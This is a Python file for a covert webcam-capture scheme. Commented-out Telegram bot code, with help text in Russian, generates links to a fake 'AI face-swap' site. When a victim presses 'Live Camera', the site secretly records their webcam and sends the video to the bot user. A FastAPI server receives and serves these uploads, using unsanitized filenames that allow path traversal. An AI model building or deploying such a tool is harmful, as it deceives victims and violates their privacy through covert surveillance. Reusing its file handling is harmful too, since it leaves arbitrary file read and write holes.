# def getToken() -> str:
#     import os
#     from os.path import join, dirname
#     from dotenv import load_dotenv

#     dotenv_path = join(dirname(__file__), ".env")
#     load_dotenv(dotenv_path)

#     BOT_TOKEN = os.environ.get("BOT_TOKEN")
#     return BOT_TOKEN


# import telebot

# bot = telebot.TeleBot(getToken())

# @bot.message_handler(commands=['start', 'help'])
# def start_message(message):
#   bot.send_message(message.chat.id,'Привет!\nЭтот бот генерирует ссылку на фейковый сайт с нейросетью которая якобы меняет твое лицо\nКогда жертва нажмет кнопку "Live Camera" начнется запись с веб камеры жертвы и будет отправлена этим ботом тебе, а тем временем у жертвы будет бесконечная загрузка\nТакже можно сгенерировать ссылку со скримером\n\n/gen - Сгенерировать ссылку без скримера\n/gen_screamer - Сгенерировать ссылку со скримером\n/help - Помощь')

# @bot.message_handler(commands=["gen"])
# def gen(message):
#     bot.send_message(message.chat.id, f'https://anime-art-ai.vercel.app/?model={message.from_user.id}')

# @bot.message_handler(commands=["gen_screamer"])
# def gen(message):
#     bot.send_message(message.chat.id, f'https://anime-art-ai.vercel.app/?model={message.from_user.id}&v2=true')


# @bot.message_handler()
# def unknown_command(message):
#     bot.send_message(message.chat.id, "Я тебя не понимаю(\nНапиши /help")

# bot.infinity_polling()




from fastapi import FastAPI, File, UploadFile
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse
from fastapi.staticfiles import StaticFiles

import os

app = FastAPI()

origins = ["*"]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

app.mount("/static", StaticFiles(directory=os.path.join(os.getcwd(), "api" , "static")), name="static")


@app.post("/upload-video")
async def upload_video(video: UploadFile = File(...)):
    try:
        with open(os.path.join(os.getcwd(), f"api/static/videos/{video.filename}"), "wb") as buffer:
            buffer.write(video.file.read())
            return "Success"
    except:
        return "Error"


@app.get("/videos/{filename}")
async def get_video(filename: str):
    return FileResponse(os.path.join(os.getcwd(), f"api/static/videos/{filename}")) 




#TODO delete video on upload to telegram